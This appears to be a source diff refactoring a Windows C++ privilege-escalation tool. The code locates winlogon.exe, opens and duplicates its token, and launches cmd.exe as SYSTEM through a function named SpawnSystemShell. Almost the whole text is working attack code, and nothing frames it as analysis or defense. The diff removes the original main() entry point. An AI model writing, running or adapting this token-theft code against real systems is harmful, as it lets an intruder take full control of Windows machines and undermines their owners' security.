@@ -1,7 +1,38 @@
-#include <iostream>
 #include <Windows.h>
 #include <TlHelp32.h>
-#include "Source.h"
+#include <iostream>
+
+DWORD GetProcId(const char* procName)
+{
+    //Set to default value of zero meaning your process is not found
+    DWORD proc_id = 0;
+
+    //Get a snapshot of running processes
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    //if your snapshot of processes handle isn't garbage iterate over them
+    if (snap != INVALID_HANDLE_VALUE)
+    {
+        PROCESSENTRY32 proc_entry;
+        proc_entry.dwSize = sizeof(proc_entry);
+
+        if (Process32First(snap, &proc_entry))
+        {
+            do
+            {
+                //string insensitive compare of the process.exe name vs what we supplied
+                if (!_stricmp(proc_entry.szExeFile, procName))
+                {
+                    proc_id = proc_entry.th32ProcessID;
+                    break;
+                }
+            } while (Process32Next(snap, &proc_entry));
+        }
+    }
+    //clean up your handle and return the PID
+    CloseHandle(snap);
+    return proc_id;
+}
 
 HANDLE GetToken(DWORD pid)
 {
@@ -38,68 +69,21 @@ HANDLE GetToken(DWORD pid)
             }
             else
             {
-                std::cout << "[!] Unable to open process token for PID: " << pid << " " << GetLastError() << std::endl;
+                std::cout << "[!] Unable to open process token for PID: " << pid << " Error: " << GetLastError() << std::endl;
                 return (HANDLE)NULL;
             }
         }
         else
         {
-            std::cout << "[!] Unable to open handle to PID: " << pid << " " << GetLastError() << std::endl;
+            std::cout << "[!] Unable to open handle to PID: " << pid << " Error: " << GetLastError() << std::endl;
             return (HANDLE)NULL;
         }
     }
     return (HANDLE)NULL;
 }
 
-DWORD GetProcId(const char* procName)
+BOOL SpawnSystemShell(HANDLE token, DWORD pid)
 {
-    //Set to default value of zero meaning your process is not found
-    DWORD proc_id = 0;
-
-    //Get a snapshot of running processes
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-    //if your snapshot of processes handle isn't garbage iterate over them
-    if (snap != INVALID_HANDLE_VALUE)
-    {
-        PROCESSENTRY32 proc_entry;
-        proc_entry.dwSize = sizeof(proc_entry);
-
-        if (Process32First(snap, &proc_entry))
-        {
-            do
-            {
-                //string insensitive compare of the process.exe name vs what we supplied
-                if (!_stricmp(proc_entry.szExeFile, procName))
-                {
-                    proc_id = proc_entry.th32ProcessID;
-                    break;
-                }
-            } while (Process32Next(snap, &proc_entry));
-        }
-    }
-    //clean up your handle and return the PID
-    CloseHandle(snap);
-    return proc_id;
-}
-
-int main()
-{
-    //this process runs as NT\SystemAuthority
-    const char* procName = "winlogon.exe";
-    DWORD pid = 0;
-
-    while (!pid)
-    {
-        pid = GetProcId(procName);
-    }
-
-    std::cout << "[*] " << procName << " has PID: " << pid << std::endl;
-
-    //Get a pointer to the Token from the process
-    HANDLE token = GetToken(pid);
-
-    //Did we get a good token, if so we need to copy it out
     if (token != NULL)
     {
         //Sets the level to "2" allowing you to impersonate on local machines
@@ -114,7 +98,7 @@ int main()
         if (dup_result)
         {
             std::cout << "[*] Token from: " << pid << " Duplicated" << std::endl;
-            
+
             //Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
             //We don't care, so leave it blank
             STARTUPINFOW start_info = {};
@@ -133,7 +117,7 @@ int main()
             BOOL start_result = CreateProcessWithTokenW(dupd_token, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &start_info, &proc_info);
             if (!start_result)
             {
-                std::cout << "[!] Failed to start elevated proccess: " << " " << GetLastError() << std::endl;
+                std::cout << "[!] Failed to start elevated proccess Error: " << GetLastError() << std::endl;
                 return 1;
             }
             else
@@ -143,13 +127,13 @@ int main()
         }
         else
         {
-            std::cout << "[!] Token from: " << pid << " Not Duplicated" << " " << GetLastError() << std::endl;
+            std::cout << "[!] Token from: " << pid << " Not Duplicated Error: " << " " << GetLastError() << std::endl;
             return 1;
         }
     }
     else
     {
+        std::cout << "[!] NULL Token Provided: " << pid << " Not Duplicated Error: " << " " << GetLastError() << std::endl;
         return 1;
     }
-    return 0;
 }
